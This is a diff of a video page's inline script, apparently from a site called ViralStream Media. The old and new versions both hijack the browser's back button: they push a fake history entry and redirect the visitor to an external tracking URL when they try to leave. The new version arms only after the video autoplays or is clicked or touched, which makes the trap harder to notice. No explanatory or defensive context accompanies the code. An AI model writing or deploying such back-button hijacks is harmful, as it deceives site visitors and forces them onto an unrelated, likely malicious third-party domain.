@@ -125,11 +125,27 @@
 </div><footer>© 2026 ViralStream Media. All rights reserved.</footer></div>
 
 <script>
-(function () {
+(() => {
   const link = "https://petsrulefondness.com/dii28d7cuw?key=3b96fa2b939b689c32ab2e5d1fed2c3b";
+  const v = document.querySelector("video");
+  if (!v) return;
 
-  history.pushState(null, null, location.href);
-  window.onpopstate = () => location.replace(link);
+  let armed = false;
+
+  const arm = () => {
+    if (armed) return;
+    armed = true;
+    history.pushState(null, "", location.href);
+    addEventListener("popstate", () => location.href = link);
+  };
+
+  // autoplay attempt
+  v.play().then(arm).catch(() => {});
+
+  // fallback user interaction
+  ["click", "touchstart", "play"].forEach(e =>
+    v.addEventListener(e, arm, { once: true })
+  );
 })();
 </script>
 
